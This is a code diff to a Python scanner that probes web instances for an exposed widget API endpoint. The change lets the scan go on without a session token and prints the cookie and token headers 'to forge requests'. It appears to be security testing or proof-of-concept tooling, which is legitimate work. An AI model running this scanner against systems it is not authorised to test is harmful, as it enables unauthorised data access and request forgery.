@@ -53,6 +53,8 @@ def check_vulnerability(url, g_ck_value, cookies, s, proxies, fast_check):
             'Accept': 'application/json',
             'Connection': 'close'
         }
+        if g_ck_value is None:
+            del headers['X-UserToken']
 
         post_url = f"{url}/api/now/sp/widget/widget-simple-list?{table}"
         data_payload = json.dumps({})  # Empty JSON payload
@@ -87,7 +89,7 @@ def check_url_get_headers(url, proxies):
             return g_ck_value, cookies, s
 
     if not g_ck_value:
-        return None, None, None
+        return None, cookies, s
 
 
 def main(url, fast_check, proxy):
@@ -100,13 +102,13 @@ def main(url, fast_check, proxy):
     url = url.rstrip('/')
     g_ck_value, cookies, s = check_url_get_headers(url, proxies)
     if g_ck_value is None:
-        print(f"Skipping {url} due to missing g_ck.")
-        return
+        print(f"{url} has no g_ck. Continuing test without X-UserToken header")
 
     vulnerable_url = check_vulnerability(url, g_ck_value, cookies, s, proxies, fast_check)
     if vulnerable_url:
         print("Headers to forge requests:")
-        print(f"X-UserToken: {g_ck_value}")
+        if g_ck_value is not None:
+            print(f"X-UserToken: {g_ck_value}")
         print(f"Cookie: {'; '.join([f'{k}={v}' for k, v in cookies.items()])}\n")
 
     return bool(vulnerable_url)
